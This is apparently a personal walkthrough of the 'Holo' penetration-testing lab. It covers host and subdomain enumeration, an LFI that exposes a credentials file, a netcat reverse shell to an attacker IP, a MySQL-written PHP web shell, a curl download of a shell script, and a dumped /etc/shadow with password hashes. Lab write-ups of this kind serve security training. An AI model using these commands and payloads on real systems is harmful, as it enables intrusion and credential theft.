# Holo network
> Silver Garcia

## Enumeration
Discovering hosts:
```bash
sudo nmap -sV -sC -p- -v 10.200.95.0/24
Scanning 2 hosts [65535 ports/host]
Discovered open port 22/tcp on 10.200.95.250
Discovered open port 22/tcp on 10.200.95.33
Discovered open port 80/tcp on 10.200.95.33
Discovered open port 33060/tcp on 10.200.95.33
```

WordPress 5.5.3 running on 10.200.95.33:80

### Domain enumeration
**wfuzz**
```bash
wfuzz -u http://10.200.95.33 -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.holo.live" --hc 400 --hl 156
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.200.95.33/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000001:   200        155 L    1398 W     21405 Ch    "www"
000000024:   200        75 L     158 W      1845 Ch     "admin"                                               
000000019:   200        271 L    701 W      7515 Ch     "dev" 
```

`admin.holo.live/robots.txt` content:
```
User-agent: *
Disallow: /var/www/admin/db.php
Disallow: /var/www/admin/dashboard.php
Disallow: /var/www/admin/supersecretdir/creds.txt
```

`img.php` file on dev.holo.live is vulnerable to LFI:
```
http://dev.holo.live/img.php?file=/etc/passwd
```

Could read `creds.txt` file exploiting the LFI:
```
http://dev.holo.live/img.php?file=/var/www/admin/supersecretdir/creds.txt
```

Content:
```
I know you forget things, so I'm leaving this note for you:
admin:DBManagerLogin!
- gurag <3
```

Got access to admin.holo.live using found credentials.

## Getting access L-SRV01
dashboard.php is vulnerable to RCE.
Getting a reverse shell:
1. Set listener and exploit RCE
Listener:
```bash
nc -lvnp 7777
```
```
http://admin.holo.live/dashboard.php?cmd=nc%20-e%20/bin/bash%2010.50.74.17%207777
```

### Enumeration
Create a living-of-the-land port scanner to scan default gateway:
```bash
#!/bin/bash
ports=(22 53 80 443 3306 8080 8443)
for port in ${ports[@]}; do
        timeout 1 bash -c "echo 'test' > /dev/tcp/192.168.100.1/$port && echo $port is open"
done
```
Result:
```
www-data@d0b5d3399e7c:/tmp$ ./scanner.sh
22 is open
bash: connect: Connection refused
bash: /dev/tcp/192.168.100.1/53: Connection refused
80 is open
bash: connect: Connection refused
bash: /dev/tcp/192.168.100.1/443: Connection refused
3306 is open
8080 is open
bash: connect: Connection refused
bash: /dev/tcp/192.168.100.1/8443: Connection refused
```

/var/www/admin/db_connect.php file content:
```
<?php

define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');

$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);

if($connection == false){

        die("Error: Connection to Database could not be made." . mysqli_connect_error());
}
?>
```


#### MySQL enumeration
Connection command
```bash
mysql -u admin -p -h 192.168.100.1
```

Databases
```
show databases;
+--------------------+
| Database           |
+--------------------+
| DashboardDB        |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

Tables on DashboardDB
```
show tables;
+-----------------------+
| Tables_in_DashboardDB |
+-----------------------+
| users                 |
+-----------------------+
```

Content of users table
```
select * from users;
+----------+-----------------+
| username | password        |
+----------+-----------------+
| admin    | DBManagerLogin! |
| gurag    | AAAA            |
+----------+-----------------+
```

Got access using MySQL to create file on web server to get RCE
1. Create file
```bash
select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php'
```
2. Download reverse shell file on L-SRV01
```bash
curl%20http%3A%2F%2F10.50.74.17%3A80%2Fshell-silver.sh%20-o%20shell-silver.sh
```
3. Set listener and execute file
```bash
curl http://192.168.100.1:8080/shell.php?cmd=./shell-silver.sh
```

With root privileges dumped /etc/shadow file.
```
root:$6$TvYo6Q8EXPuYD8w0$Yc.Ufe3ffMwRJLNroJuMvf5/Telga69RdVEvgWBC.FN5rs9vO0NeoKex4jIaxCyWNPTDtYfxWn.EM4OLxjndR1:18605:0:99999:7:::
daemon:*:18512:0:99999:7:::
bin:*:18512:0:99999:7:::
sys:*:18512:0:99999:7:::
sync:*:18512:0:99999:7:::
games:*:18512:0:99999:7:::
man:*:18512:0:99999:7:::
lp:*:18512:0:99999:7:::
mail:*:18512:0:99999:7:::
news:*:18512:0:99999:7:::
uucp:*:18512:0:99999:7:::
proxy:*:18512:0:99999:7:::
www-data:*:18512:0:99999:7:::
backup:*:18512:0:99999:7:::
list:*:18512:0:99999:7:::
irc:*:18512:0:99999:7:::
gnats:*:18512:0:99999:7:::
nobody:*:18512:0:99999:7:::
systemd-network:*:18512:0:99999:7:::
systemd-resolve:*:18512:0:99999:7:::
systemd-timesync:*:18512:0:99999:7:::
messagebus:*:18512:0:99999:7:::
syslog:*:18512:0:99999:7:::
_apt:*:18512:0:99999:7:::
tss:*:18512:0:99999:7:::
uuidd:*:18512:0:99999:7:::
tcpdump:*:18512:0:99999:7:::
sshd:*:18512:0:99999:7:::
landscape:*:18512:0:99999:7:::
pollinate:*:18512:0:99999:7:::
ec2-instance-connect:!:18512:0:99999:7:::
systemd-coredump:!!:18566::::::
ubuntu:!$6$6/mlN/Q.1gopcuhc$7ymOCjV3RETFUl6GaNbau9MdEGS6NgeXLM.CDcuS5gNj2oIQLpRLzxFuAwG0dGcLk1NX70EVzUUKyUQOezaf0.:18601:0:99999:7:::
lxd:!:18566::::::
mysql:!:18566:0:99999:7:::
dnsmasq:*:18566:0:99999:7:::
linux-admin:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:18570:0:99999:7:::
```